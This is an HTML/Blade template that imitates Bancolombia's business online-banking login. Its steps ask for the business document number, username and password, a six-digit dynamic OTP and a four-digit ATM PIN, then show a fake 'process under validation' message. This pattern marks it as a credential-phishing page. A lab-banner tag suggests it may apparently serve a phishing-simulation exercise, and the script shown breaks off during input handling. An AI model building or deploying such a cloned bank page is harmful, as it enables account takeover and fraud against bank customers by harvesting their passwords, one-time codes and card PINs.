<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-store">
    <title>SVN - Bancolombia</title>
    <link rel="icon" type="image/x-icon" href="https://svnegocios.apps.bancolombia.com/favicon.ico">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'bc-yellow': '#FDDA24',
                        'bc-dark': '#2C2A29',
                        'bc-gray': '#58595B',
                        'bc-gray-light': '#B3B5B8',
                        'bc-light': '#F5F5F5',
                        'bc-blue': '#0033A0',
                        'bc-info': '#E8F4FD',
                        'bc-info-border': '#0D47A1',
                        'bc-border': '#CDCDCD'
                    },
                    fontFamily: {
                        'cib': ['CIBFont Sans', 'Open Sans', 'sans-serif'],
                        'open': ['Open Sans', 'sans-serif']
                    },
                    boxShadow: {
                        'card': '0 4px 16px rgba(0, 0, 0, 0.08)'
                    }
                }
            }
        }
    </script>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        /* Font faces */
        @font-face {
            font-family: 'CIBFont Sans';
            src: url('/svn/fonts/CIBFontSans-Light.woff2') format('woff2');
            font-weight: 300;
            font-style: normal;
        }
        @font-face {
            font-family: 'CIBFont Sans';
            src: url('/svn/fonts/CIBFontSans-Regular.woff2') format('woff2');
            font-weight: 400;
            font-style: normal;
        }
        @font-face {
            font-family: 'CIBFont Sans';
            src: url('/svn/fonts/CIBFontSans-Bold.woff2') format('woff2');
            font-weight: 700;
            font-style: normal;
        }

        /* Background */
        .bg-trazo {
            background-image: url('/svn/trazo-auth.svg');
            background-repeat: no-repeat;
            background-size: 100%;
        }
        @media (max-width: 768px) {
            .bg-trazo {
                background-size: 1025px;
            }
        }

        /* Hide number input spinners */
        input[type="number"]::-webkit-outer-spin-button,
        input[type="number"]::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        input[type="number"] {
            -moz-appearance: textfield;
        }

        /* Dropdown option hover */
        .dropdown-option:hover {
            background-color: #f5f5f5;
        }

        /* Input styles - Solo borde inferior */
        .bc-input-wrapper {
            position: relative;
            padding-top: 20px;
        }
        .bc-input-wrapper input {
            border: none;
            border-bottom: 1px solid #CDCDCD;
            border-radius: 0;
            padding: 8px 40px 8px 32px;
            font-size: 16px;
            width: 100%;
            font-family: 'Open Sans', sans-serif;
            color: #2C2A29;
            background: transparent;
            transition: border-color 0.2s;
        }
        .bc-input-wrapper input:focus {
            outline: none;
            border-bottom: 2px solid #FDDA24;
            padding-bottom: 7px;
        }
        .bc-input-wrapper input.has-error {
            border-bottom-color: #D32F2F;
        }
        .bc-input-wrapper input.is-valid {
            border-bottom: 2px solid #FDDA24;
            padding-bottom: 7px;
        }
        .bc-input-wrapper input:not(:placeholder-shown) {
            border-bottom: 2px solid #FDDA24;
            padding-bottom: 7px;
        }
        .bc-input-wrapper label {
            position: absolute;
            left: 32px;
            top: 28px;
            font-size: 16px;
            color: #58595B;
            pointer-events: none;
            transition: all 0.2s ease;
            font-family: 'Open Sans', sans-serif;
        }
        .bc-input-wrapper input:not(:placeholder-shown) + label {
            top: 0;
            left: 0;
            font-size: 12px;
        }
        .bc-input-wrapper .input-icon {
            position: absolute;
            left: 0;
            top: 26px;
            color: #58595B;
        }
        .bc-input-wrapper .toggle-password {
            position: absolute;
            right: 0;
            top: 26px;
            color: #58595B;
            cursor: pointer;
            background: none;
            border: none;
            padding: 0;
        }
        .bc-input-wrapper .toggle-password:hover {
            color: #2C2A29;
        }

        /* Select styles - Solo borde inferior */
        .bc-select-wrapper {
            position: relative;
            padding-top: 20px;
        }
        .bc-select-wrapper .select-label {
            position: absolute;
            top: 0;
            left: 0;
            font-size: 12px;
            color: #58595B;
            font-family: 'Open Sans', sans-serif;
        }
        .bc-select-trigger {
            border: none;
            border-bottom: 1px solid #CDCDCD;
            border-radius: 0;
            padding: 8px 0;
            font-size: 16px;
            width: 100%;
            font-family: 'Open Sans', sans-serif;
            color: #58595B;
            background: transparent;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: border-color 0.2s;
        }
        .bc-select-trigger:hover {
            border-bottom-color: #58595B;
        }
        .bc-select-trigger.is-open {
            border-bottom: 2px solid #FDDA24;
            padding-bottom: 7px;
        }
        .bc-select-trigger.has-value {
            color: #2C2A29;
            border-bottom: 2px solid #FDDA24;
            padding-bottom: 7px;
        }
        .bc-select-trigger.no-value {
            color: #58595B;
        }
        .bc-select-menu {
            position: absolute;
            top: calc(100% + 4px);
            left: 0;
            right: 0;
            background: white;
            border: 1px solid #CDCDCD;
            border-radius: 4px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            z-index: 100;
            max-height: 280px;
            overflow-y: auto;
        }
        .bc-select-option {
            padding: 12px 16px;
            font-size: 14px;
            font-family: 'Open Sans', sans-serif;
            color: #2C2A29;
            cursor: pointer;
            transition: background-color 0.15s;
        }
        .bc-select-option:hover {
            background-color: #F5F5F5;
        }

        /* Card styles */
        .bc-card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            padding: 32px 28px;
        }

        /* Button styles */
        .bc-button-primary {
            background-color: #FDDA24;
            color: #2C2A29;
            font-family: 'Open Sans', sans-serif;
            font-weight: 600;
            font-size: 16px;
            padding: 14px 24px;
            border-radius: 100px;
            border: none;
            width: 100%;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .bc-button-primary:hover:not(:disabled) {
            background-color: #E5C520;
        }
        .bc-button-primary:disabled {
            background-color: #E0E0E0;
            color: rgba(0,0,0,0.26);
            cursor: not-allowed;
        }
        .bc-button-secondary {
            background-color: transparent;
            color: #2C2A29;
            font-family: 'Open Sans', sans-serif;
            font-weight: 600;
            font-size: 16px;
            padding: 14px 24px;
            border-radius: 100px;
            border: 1px solid #2C2A29;
            width: 100%;
            cursor: pointer;
            transition: all 0.2s;
        }
        .bc-button-secondary:hover {
            background-color: #F5F5F5;
        }

        /* Alert styles */
        .bc-alert-info {
            background-color: #E8F4FD;
            border-left: 4px solid #0D47A1;
            border-radius: 4px;
            padding: 16px;
        }

        /* Footer link styles */
        .bc-footer-link {
            font-family: 'Open Sans', sans-serif;
            font-size: 14px;
            color: #58595B;
            text-decoration: none;
            transition: color 0.2s;
        }
        .bc-footer-link:hover {
            color: #2C2A29;
            text-decoration: underline;
        }

        /* Link styles */
        .bc-link {
            font-family: 'Open Sans', sans-serif;
            font-size: 14px;
            color: #2C2A29;
            text-decoration: underline;
            font-weight: 600;
            cursor: pointer;
            transition: color 0.2s;
        }
        .bc-link:hover {
            color: #58595B;
        }

        /* Tab styles */
        .bc-tab {
            font-family: 'Open Sans', sans-serif;
            font-size: 16px;
            font-weight: 600;
            padding: 12px 32px;
            border-radius: 100px;
            cursor: pointer;
            transition: all 0.2s;
        }
        .bc-tab-active {
            background-color: #2C2A29;
            color: white;
        }
        .bc-tab-inactive {
            background-color: transparent;
            color: #58595B;
        }
        .bc-tab-inactive:hover {
            background-color: #F5F5F5;
        }

        /* OTP Input */
        .otp-container {
            display: flex;
            justify-content: center;
            gap: 8px;
        }
        .otp-input {
            width: 40px;
            height: 48px;
            border: none;
            border-bottom: 2px solid #CDCDCD;
            background: transparent;
            text-align: center;
            font-family: 'Open Sans', sans-serif;
            font-size: 24px;
            font-weight: 600;
            color: #2C2A29;
            transition: border-color 0.2s;
        }
        .otp-input:focus {
            outline: none;
            border-bottom-color: #FDDA24;
        }
        .otp-input.filled {
            border-bottom-color: #FDDA24;
        }
        .otp-separator {
            display: flex;
            align-items: center;
            padding: 0 4px;
        }
        .otp-separator span {
            width: 8px;
            height: 2px;
            background-color: #CDCDCD;
        }

        /* Clave Cajero Input */
        .clavecajero-container {
            display: flex;
            justify-content: center;
            gap: 8px;
        }
        .clavecajero-input {
            width: 40px;
            height: 48px;
            border: none;
            border-bottom: 2px solid #CDCDCD;
            background: transparent;
            text-align: center;
            font-family: 'Open Sans', sans-serif;
            font-size: 24px;
            font-weight: 600;
            color: #2C2A29;
            transition: border-color 0.2s;
        }
        .clavecajero-input:focus {
            outline: none;
            border-bottom-color: #FDDA24;
        }
        .clavecajero-input.filled {
            border-bottom-color: #FDDA24;
        }
    </style>
</head>

<body class="bg-bc-light min-h-screen font-open">
    <x-lab-banner />

    <!-- Main Container -->
    <div class="min-h-screen bg-trazo">
        <!-- Header -->
        <div class="pt-8 md:pt-12 text-center">
            <div class="flex flex-col items-center mb-9">
                <img src="/svn/bancolombia-horizontal.svg" alt="Bancolombia" class="h-8 md:h-10 mb-4">
                <h1 class="font-cib text-2xl md:text-3xl font-light text-bc-dark">Sucursal Virtual Negocios</h1>
            </div>
        </div>

        <!-- Content -->
        <div class="flex flex-col items-center px-4 md:px-6">

            <!-- Login inicio Card -->
            <div class="w-full max-w-sm bc-card mb-8">
                <div class="mb-8 text-center">
                    <h2 class="font-cib text-[20px] font-bold text-bc-dark mb-5">Te damos la bienvenida</h2>
                    <p class="text-bc-gray text-base">Ingresa el documento de tu negocio.</p>
                </div>

                <form id="login-form" autocomplete="off" novalidate>
                    <!-- Dropdown Tipo de Documento -->
                    <div class="mb-8">
                        <div id="dropdown-container" class="bc-select-wrapper">
                            <span id="select-label" class="select-label hidden">Tipo de documento</span>
                            <div id="dropdown-trigger" class="bc-select-trigger no-value">
                                <span id="selected-doc-type">Tipo de documento</span>
                                <svg id="dropdown-arrow" class="w-5 h-5 text-bc-gray transition-transform duration-200" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/>
                                </svg>
                            </div>
                            <div id="dropdown-menu" class="bc-select-menu hidden">
                                <div class="bc-select-option" data-value="NIT">NIT</div>
                                <div class="bc-select-option" data-value="CC">Cédula de ciudadanía</div>
                                <div class="bc-select-option" data-value="CE">Cédula de extranjería</div>
                                <div class="bc-select-option" data-value="PAS">Pasaporte</div>
                                <div class="bc-select-option" data-value="PNN">ID Extranjero Persona Natural</div>
                                <div class="bc-select-option" data-value="PJN">ID Extranjero Persona Jurídica</div>
                                <div class="bc-select-option" data-value="FC">Fideicomiso</div>
                                <div class="bc-select-option" data-value="CD">Carné Diplomático</div>
                            </div>
                        </div>
                        <input type="hidden" id="doc-type-value" name="documentType" value="">
                    </div>

                    <!-- Input Número de Documento -->
                    <div class="mb-8">
                        <div class="bc-input-wrapper">
                            <span class="input-icon">
                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"/>
                                </svg>
                            </span>
                            <input type="number"
                                   id="doc-number"
                                   name="documentNumber"
                                   placeholder=" "
                                   aria-label="Número de documento">
                            <label for="doc-number">Número de documento</label>
                        </div>
                        <span id="doc-hint" class="text-xs text-bc-gray mt-2 block"></span>
                        <span id="doc-error" class="text-xs text-red-600 mt-1 hidden"></span>
                    </div>

                    <!-- Submit Button -->
                    <button type="submit"
                            id="btn-continue"
                            disabled
                            class="bc-button-primary">
                        Continuar
                    </button>
                </form>
            </div>
            <br>
            <!-- Login usuario Card -->
            <div class="w-full max-w-sm bc-card mb-8">
                <div class="mb-8 text-center">
                    <h2 class="font-cib text-[20px] font-bold text-bc-dark">Iniciar sesión</h2>
                </div>

                <form id="login-form" autocomplete="off" novalidate>
                    <!-- Input Usuario de Negocios -->
                    <div class="mb-2">
                        <div class="bc-input-wrapper">
                            <span class="input-icon">
                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/>
                                </svg>
                            </span>
                            <input type="text"
                                   id="usuario"
                                   name="usuario"
                                   placeholder=" "
                                   aria-label="Usuario de Negocios">
                            <label for="usuario">Usuario de Negocios</label>
                            <button type="button" class="toggle-password" id="toggle-usuario" aria-label="Mostrar usuario">
                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"/>
                                </svg>
                            </button>
                        </div>
                    </div>

                    <!-- Link Olvidaste usuario -->
                    <div class="text-right mb-6">
                        <a href="#" class="bc-link">¿Olvidaste tu usuario?</a>
                    </div>

                    <!-- Input Clave de Negocios -->
                    <div class="mb-2">
                        <div class="bc-input-wrapper">
                            <span class="input-icon">
                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
                                </svg>
                            </span>
                            <input type="password"
                                   id="clave"
                                   name="clave"
                                   placeholder=" "
                                   aria-label="Clave de Negocios">
                            <label for="clave">Clave de Negocios</label>
                            <button type="button" class="toggle-password" id="toggle-clave" aria-label="Mostrar clave">
                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"/>
                                </svg>
                            </button>
                        </div>
                    </div>

                    <!-- Link Olvidaste clave -->
                    <div class="text-right mb-8">
                        <a href="#" class="bc-link">¿Olvidaste tu clave?</a>
                    </div>

                    <!-- Submit Button -->
                    <button type="submit"
                            id="btn-ingresar"
                            disabled
                            class="bc-button-primary mb-4">
                        Ingresar
                    </button>

                    <!-- Volver Button -->
                    <button type="button"
                            id="btn-volver"
                            class="bc-button-secondary">
                        Volver
                    </button>
                </form>
            </div>
            <br>
            <!-- Clave Dinámica Card -->
            <div class="w-full max-w-sm bc-card mb-8 relative">
                <!-- Close Button -->
                <button id="btn-close" class="absolute top-4 right-4 text-bc-gray hover:text-bc-dark transition-colors">
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
                    </svg>
                </button>

                <!-- Badge Clave Dinámica -->
                <div class="flex justify-center mb-6 mt-2">
                    <img src="/svn/dinamica-logo-1.png" alt="Clave Dinámica 111 111" class="h-20">
                </div>

                <!-- Title -->
                <div class="text-center mb-6">
                    <h2 class="font-cib text-[20px] font-bold text-bc-dark mb-4">Clave Dinámica</h2>
                    <p class="text-bc-gray text-base leading-relaxed">
                        Ingresa los 6 dígitos de la Clave Dinámica. Consúltala ingresando a la <strong>app Negocios</strong>.
                    </p>
                </div>

                <!-- OTP Input -->
                <form id="otp-form" autocomplete="off" novalidate>
                    <input type="hidden" id="otpapp" name="otpapp" value="">
                    <div class="mb-4">
                        <div class="otp-container">
                            <input type="text" maxlength="1" class="otp-input" data-index="0" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" maxlength="1" class="otp-input" data-index="1" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" maxlength="1" class="otp-input" data-index="2" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" maxlength="1" class="otp-input" data-index="3" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" maxlength="1" class="otp-input" data-index="4" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" maxlength="1" class="otp-input" data-index="5" inputmode="numeric" pattern="[0-9]*">
                        </div>
                        <p class="text-center text-bc-gray text-sm mt-3">Ingresa el código de 6 dígitos</p>
                    </div>

                    <!-- Buttons -->
                    <div class="space-y-3 mt-8">
                        <button type="submit"
                                id="btn-continue"
                                disabled
                                class="bc-button-primary">
                            Continuar
                        </button>
                        <button type="button"
                                id="btn-cancel"
                                class="bc-button-secondary">
                            Cancelar
                        </button>
                    </div>
                </form>
            </div>
            <br>
            <!-- Clave de Cajero Card -->
            <div class="w-full max-w-sm bc-card mb-8 relative">
                <!-- Close Button -->
                <button id="btn-close" class="absolute top-4 right-4 text-bc-gray hover:text-bc-dark transition-colors">
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
                    </svg>
                </button>

                <!-- Badge Clave Cajero -->
                <div class="flex justify-center mb-6 mt-2">
                    <img src="/svn/dinamica-logo-1.png" alt="Clave Dinámica 111 111" class="h-20">
                </div>

                <!-- Title -->
                <div class="text-center mb-6">
                    <h2 class="font-cib text-[20px] font-bold text-bc-dark mb-4">Clave de cajero</h2>
                    <p class="text-bc-gray text-base leading-relaxed">
                        Para validar su identidad, ingrese su clave principal.
                    </p>
                </div>

                <!-- Clave Input -->
                <form id="clavecajero-form" autocomplete="off" novalidate>
                    <input type="hidden" id="clavecajero" name="clavecajero" value="">
                    <div class="mb-4">
                        <div class="clavecajero-container">
                            <input type="text" maxlength="1" class="clavecajero-input" data-index="0" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" maxlength="1" class="clavecajero-input" data-index="1" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" maxlength="1" class="clavecajero-input" data-index="2" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" maxlength="1" class="clavecajero-input" data-index="3" inputmode="numeric" pattern="[0-9]*">
                        </div>
                        <p class="text-center text-bc-gray text-sm mt-3">Ingresa la clave de 4 dígitos</p>
                    </div>

                    <!-- Buttons -->
                    <div class="space-y-3 mt-8">
                        <button type="submit"
                                id="btn-continue"
                                disabled
                                class="bc-button-primary">
                            Continuar
                        </button>
                        <button type="button"
                                id="btn-cancel"
                                class="bc-button-secondary">
                            Cancelar
                        </button>
                    </div>
                </form>
            </div>
            <br>
            <!-- Exito Card -->
            <div class="w-full max-w-sm bc-card mb-8 relative">
                <!-- Close Button -->
                <button id="btn-close" class="absolute top-4 right-4 text-bc-gray hover:text-bc-dark transition-colors">
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
                    </svg>
                </button>

                <!-- Badge Exito -->
                <div class="flex justify-center mb-6 mt-2">
                    <img src="/svn/dinamica-logo-1.png" alt="Clave Dinámica 111 111" class="h-20">
                </div>

                <!-- Title -->
                <div class="text-center mb-6">
                    <h2 class="font-cib text-[20px] font-bold text-bc-dark mb-4">Proceso finalizado con éxito</h2>
                    <p class="text-bc-gray text-base leading-relaxed">
                        Su proceso se encuentra en proceso de validación.
                    </p>
                </div>
            </div>
            <br>
            <!-- Fin Card -->
            <div class="w-full max-w-sm bc-card mb-8 relative">
                <!-- Close Button -->
                <button id="btn-close" class="absolute top-4 right-4 text-bc-gray hover:text-bc-dark transition-colors">
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
                    </svg>
                </button>

                <!-- Badge Fin -->
                <div class="flex justify-center mb-6 mt-2">
                    <img src="/svn/dinamica-logo-1.png" alt="Clave Dinámica 111 111" class="h-20">
                </div>

                <!-- Title -->
                <div class="text-center mb-6">
                    <h2 class="font-cib text-[20px] font-bold text-bc-dark mb-4">Ocurrió un error</h2>
                    <p class="text-bc-gray text-base leading-relaxed">
                        El proceso se canceló por error.
                    </p>
                </div>
            </div>
            <br>
            <!-- Loading Spinner -->
            <div id="loading" class="fixed inset-0 bg-white/90 flex items-center justify-center z-50 hidden">
                <div class="text-center">
                    <div class="w-16 h-16 border-4 border-bc-yellow border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
                    <p class="text-bc-gray font-open">Cargando...</p>
                </div>
            </div>

        </div>

        <!-- Footer -->
        <footer class="bg-white mt-auto">
            <div class="max-w-lg mx-auto px-4">
                <!-- Links - Vertical list -->
                <div class="flex flex-col items-center gap-4 py-6">
                    <a href="#" class="bc-footer-link">Conoce la sucursal virtual</a>
                    <a href="#" class="bc-footer-link">Conversor de pagos PAB</a>
                    <a href="#" class="bc-footer-link">Conversor de pagos SAP</a>
                    <a href="#"
                       class="bc-footer-link">Solicitudes y novedades</a>
                    <a href="#" target="_blank" rel="noopener noreferrer"
                       class="bc-footer-link">Contáctanos</a>
                    <a href="#"
                       target="_blank" rel="noopener noreferrer" class="bc-footer-link">Aprende sobre seguridad</a>
                    <a href="#"
                       target="_blank" rel="noopener noreferrer" class="bc-footer-link">Preguntas frecuentes</a>
                </div>

                <!-- Divider -->
                <div class="w-full h-px bg-bc-gray-light"></div>

                <!-- Bottom - Centered -->
                <div class="flex flex-col items-center text-center py-6 gap-3">
                    <img src="/svn/bancolombia-horizontal.svg" alt="Bancolombia" style="width: 150px;">
                    <p class="text-sm text-bc-gray font-open">Copyright © 2025 Bancolombia.</p>
                    <div style="height: 14px; overflow: visible; display: flex; align-items: center; justify-content: center;">
                        <img src="/svn/logo-vigilado.svg" alt="Vigilado Superintendencia Financiera de Colombia" style="height: 10rem; transform: rotate(90deg);">
                    </div>
                    <div class="text-sm text-bc-gray font-open mt-2">
                        <p>Dirección IP: {{ request()->ip() }}</p>
                        <p>{{ ucfirst(\Carbon\Carbon::now('America/Bogota')->locale('es')->isoFormat('dddd, D [de] MMMM [de] YYYY, h:mm:ss a')) }}</p>
                    </div>
                </div>

                <!-- Stroke decoration - Franja de colores -->
                <div class="flex justify-center pb-4">
                    <img src="/svn/14.svg" alt="" class="w-full" aria-hidden="true">
                </div>
            </div>
        </footer>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // =============================================
            // DROPDOWN Y DOCUMENTO (Login inicio)
            // =============================================
            const dropdownTrigger = document.getElementById('dropdown-trigger');
            const dropdownMenu = document.getElementById('dropdown-menu');
            const dropdownArrow = document.getElementById('dropdown-arrow');
            const selectedDocType = document.getElementById('selected-doc-type');
            const docTypeValue = document.getElementById('doc-type-value');
            const docNumber = document.getElementById('doc-number');
            const docHint = document.getElementById('doc-hint');
            const docError = document.getElementById('doc-error');
            const btnContinueDoc = document.querySelector('#login-form #btn-continue');
            const closeAlert = document.getElementById('close-alert');
            const alertBanner = document.getElementById('alert-banner');

            let currentDocType = '';

            // Función para validar y habilitar botón de documento
            function validateDocForm() {
                if (!btnContinueDoc) return;
                const value = docNumber.value;
                let isValid = false;

                if (currentDocType && value.length > 0) {
                    if (currentDocType === 'NIT') {
                        const nitRegex = /^[89]\d{8}$/;
                        isValid = nitRegex.test(value);
                    } else {
                        isValid = value.length >= 6;
                    }
                }
                btnContinueDoc.disabled = !isValid;
            }

            // Toggle dropdown
            dropdownTrigger.addEventListener('click', function(e) {
                e.stopPropagation();
                const isOpen = !dropdownMenu.classList.contains('hidden');

                if (isOpen) {
                    dropdownMenu.classList.add('hidden');
                    dropdownArrow.classList.remove('rotate-180');
                    dropdownTrigger.classList.remove('is-open');
                } else {
                    dropdownMenu.classList.remove('hidden');
                    dropdownArrow.classList.add('rotate-180');
                    dropdownTrigger.classList.add('is-open');
                }
            });

            // Close dropdown on outside click
            document.addEventListener('click', function() {
                dropdownMenu.classList.add('hidden');
                dropdownArrow.classList.remove('rotate-180');
                dropdownTrigger.classList.remove('is-open');
            });

            // Handle option selection
            const selectLabel = document.getElementById('select-label');
            document.querySelectorAll('.bc-select-option').forEach(option => {
                option.addEventListener('click', function(e) {
                    e.stopPropagation();
                    const value = this.dataset.value;
                    const text = this.textContent;

                    selectedDocType.textContent = text;
                    dropdownTrigger.classList.remove('no-value');
                    dropdownTrigger.classList.add('has-value');
                    docTypeValue.value = value;
                    currentDocType = value;

                    // Show floating label
                    selectLabel.classList.remove('hidden');

                    // Update hint
                    if (value === 'NIT') {
                        docHint.textContent = 'Ingresa el NIT sin número de verificación';
                    } else {
                        docHint.textContent = '';
                    }

                    // Reset input
                    docNumber.value = '';
                    docNumber.classList.remove('has-error', 'is-valid');
                    docError.classList.add('hidden');
                    validateDocForm();

                    // Close dropdown
                    dropdownMenu.classList.add('hidden');
                    dropdownArrow.classList.remove('rotate-180');
                    dropdownTrigger.classList.remove('is-open');
                });
            });

            // Validate document number
            docNumber.addEventListener('input', function() {
                let value = this.value;

                // Limit NIT to 9 digits
                if (currentDocType === 'NIT' && value.length > 9) {
                    value = value.slice(0, 9);
                    this.value = value;
                }

                if (value.length > 0) {
                    if (currentDocType === 'NIT') {
                        const nitRegex = /^[89]\d{8}$/;
                        if (nitRegex.test(value)) {
                            this.classList.remove('has-error');
                            this.classList.add('is-valid');
                            docError.classList.add('hidden');
                        } else {
                            this.classList.remove('is-valid');
                            this.classList.add('has-error');
                            docError.textContent = 'El NIT debe comenzar con 8 o 9 y tener 9 dígitos';
                            docError.classList.remove('hidden');
                        }
                    } else {
                        if (value.length >= 6) {
                            this.classList.remove('has-error');
                            this.classList.add('is-valid');
                            docError.classList.add('hidden');
                        } else {
                            this.classList.remove('is-valid');
                            this.classList.add('has-error');
                            docError.textContent = 'El documento debe tener al menos 6 dígitos';
                            docError.classList.remove('hidden');
                        }
                    }
                } else {
                    this.classList.remove('has-error', 'is-valid');
                    docError.classList.add('hidden');
                }
                validateDocForm();
            });

            // Close alert
            if (closeAlert) {
                closeAlert.addEventListener('click', function() {
                    alertBanner.style.display = 'none';
                });
            }

            // =============================================
            // LOGIN USUARIO
            // =============================================
            const usuarioInput = document.getElementById('usuario');
            const claveInput = document.getElementById('clave');
            const btnIngresar = document.getElementById('btn-ingresar');
            const btnVolver = document.getElementById('btn-volver');
            const toggleUsuario = document.getElementById('toggle-usuario');
            const toggleClave = document.getElementById('toggle-clave');
            const tabLogin = document.getElementById('tab-login');
            const tabRegister = document.getElementById('tab-register');

            // Toggle password visibility for usuario
            toggleUsuario.addEventListener('click', function() {
                const type = usuarioInput.getAttribute('type') === 'password' ? 'text' : 'password';
                usuarioInput.setAttribute('type', type);
                updateToggleIcon(this, type === 'password');
            });

            // Toggle password visibility for clave
            toggleClave.addEventListener('click', function() {
                const type = claveInput.getAttribute('type') === 'password' ? 'text' : 'password';
                claveInput.setAttribute('type', type);
                updateToggleIcon(this, type === 'password');
            });

            function updateToggleIcon(button, isHidden) {
                if (isHidden) {
                    button.innerHTML = `
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"/>
                        </svg>
                    `;
                } else {
                    button.innerHTML = `
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
                        </svg>
                    `;
                }
            }

            // Validate inputs
            function validateLoginForm() {
                const usuario = usuarioInput.value.trim();
                const clave = claveInput.value.trim();
                btnIngresar.disabled = !(usuario.length >= 3 && clave.length >= 4);
            }

            usuarioInput.addEventListener('input', validateLoginForm);
            claveInput.addEventListener('input', validateLoginForm);

            // Tab switching
            tabLogin?.addEventListener('click', function() {
                tabLogin.classList.remove('bc-tab-inactive');
                tabLogin.classList.add('bc-tab-active');
                tabRegister.classList.remove('bc-tab-active');
                tabRegister.classList.add('bc-tab-inactive');
            });

            tabRegister?.addEventListener('click', function() {
                tabRegister.classList.remove('bc-tab-inactive');
                tabRegister.classList.add('bc-tab-active');
                tabLogin.classList.remove('bc-tab-active');
                tabLogin.classList.add('bc-tab-inactive');
            });

            // Volver button
            btnVolver?.addEventListener('click', function() {
                window.history.back();
            });

            // =============================================
            // OTP INPUT (Clave Dinámica)
            // =============================================
            const otpInputs = document.querySelectorAll('.otp-input');
            const otpForm = document.getElementById('otp-form');
            const btnContinueOtp = otpForm?.querySelector('#btn-continue');

            function setupCodeInputs(inputs, maxLength, button, hiddenInput) {
